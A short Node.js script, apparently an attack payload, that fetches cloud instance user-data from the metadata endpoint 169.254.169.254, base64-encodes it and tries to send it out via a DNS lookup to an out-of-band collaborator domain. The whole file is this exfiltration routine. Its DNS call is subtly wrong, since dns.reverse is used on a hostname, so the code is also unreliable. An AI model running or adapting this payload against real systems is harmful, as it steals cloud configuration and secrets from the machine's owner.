const dns = require('dns');
const { exec } = require('child_process');

// Replace with your Burp Collaborator domain
const collaboratorDomain = 'cgztbp62vtc0000wrwe0gex7f5yyyyyyb.oast.fun';

// Run the command and send the output to Burp Collaborator via DNS
exec('curl http://169.254.169.254/latest/user-data', (error, stdout, stderr) => {
  if (error) {
    console.error(`exec error: ${error}`);
    return;
  }

  const data = Buffer.from(stdout).toString('base64');
  const hostname = dns.reverse(`${data}.${collaboratorDomain}`, (err, addresses) => {
    if (err) {
      console.error(`DNS error: ${err}`);
      return;
    }
    console.log(`Hostname sent to Burp Collaborator: ${addresses}`);
  });
});
